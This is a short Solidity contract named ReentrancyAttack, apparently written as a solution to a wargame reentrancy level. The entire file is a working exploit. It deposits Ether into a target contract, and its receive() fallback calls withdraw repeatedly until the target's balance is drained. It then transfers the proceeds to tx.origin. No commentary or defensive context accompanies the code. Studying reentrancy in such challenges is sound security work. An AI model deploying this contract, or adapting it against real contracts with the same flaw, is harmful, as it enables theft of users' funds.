// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import './IReentrance.sol';

contract ReentrancyAttack{
  using SafeMath for uint256;
  IReentrance public reentrance;

  constructor(address _reentrance) public{
    reentrance=IReentrance(_reentrance);
  }

  function exploitReentrance() public payable{
    require(msg.value>0,"Ether wasn't sent");
    reentrance.donate.value(msg.value)(address(this));
    reentrance.withdraw(msg.value);
  }

  receive() external payable{
    uint256 reentanceBalance=address(reentrance).balance;
    if(reentanceBalance!=0){
      if(reentanceBalance<msg.value){
        reentrance.withdraw(reentanceBalance);
      }else{
        reentrance.withdraw(msg.value);
      }
    }else{
      tx.origin.transfer(address(this).balance);
    }
    

  }
}